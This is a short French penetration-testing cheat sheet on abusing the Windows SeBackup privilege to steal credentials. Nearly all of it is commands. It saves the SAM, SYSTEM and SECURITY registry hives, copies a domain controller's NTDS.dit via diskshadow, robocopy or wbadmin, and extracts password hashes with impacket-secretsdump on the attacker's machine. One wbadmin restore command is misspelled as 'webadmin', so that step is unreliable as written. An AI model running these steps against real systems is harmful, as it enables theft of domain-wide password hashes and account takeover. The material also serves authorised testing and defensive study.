Le privilège SeBackup donne droit à l'utilisateur d'effectuer des sauvegardes. Le principe pour exploiter ce privilège est donc d'effectuer des sauvegardes du registre/de fichiers sensibles/etc afin d'obtenir les informations voulues.

### Si le privilège est "disabled"

https://github.com/giuliano108/SeBackupPrivilege

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

Ce qui permettra d'activer le privilège.

---
### Sauvegarde du registre

Une sauvegarde du registre va permettre de récupérer les hash présents dans la SAM.

```cmd
reg save HKLM\SECURITY security.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
```

Une fois rapatrié sur notre poste attaquant, il est possible d'extraire les différents hash:

```bash
impacket-secretsdump -security security.save -system system.save -sam sam.save local
```

---
### Sauvegarde du fichier NTDS.dit

Plusieurs méthodes sont possibles selon le contexte.
#### Diskshadow

Création d'un script "backup.txt" pour diskshadow:

```cmd
set verbose on  
set metadata C:\Windows\Temp\meta.cab  
set context clientaccessible  
set context persistent  
begin backup  
add volume C: alias cdrive  
create  
expose %cdrive% E:  
end backup
```

#### Puis l'exécuter

```cmd
diskshadow /s .\backup.txt
```

#### Robocopy
#### Ceci va créer une réplique de C:\ sur le lecteur E:\ => les fichiers de E:\ sont ensuite copiables.

```cmd
robocopy /b E:\Windows\ntds . ntds.dit
```

#### Une fois rapatrié sur notre poste attaquant, il est possible d'extraire les différents hash

```bash
impacket-secretsdump -system system.save -ntds ntds.dit local
```

---
### Wbadmin

#### Wbadmin permet de créer un backup

```cmd
wbadmin start backup -quiet -backuptarget:\\dc01\c$\temp -include:c:\windows\ntds
```

#### On récupère ensuite la version du backup

```cmd
wbadmin get versions
```

#### Puis on la restore à un endroit accessible

```cmd
webadmin start recovery -quiet -version:07/26/2021-03:16 -itemtype:file -item:c:\windows\ntds\ntds.dit -recoverytarget:c:\temp -notrestoreacl
```

#### Une fois rapatrié sur notre poste attaquant, il est possible d'extraire les différents hash

```bash
impacket-secretsdump -system system.save -ntds ntds.dit local
```
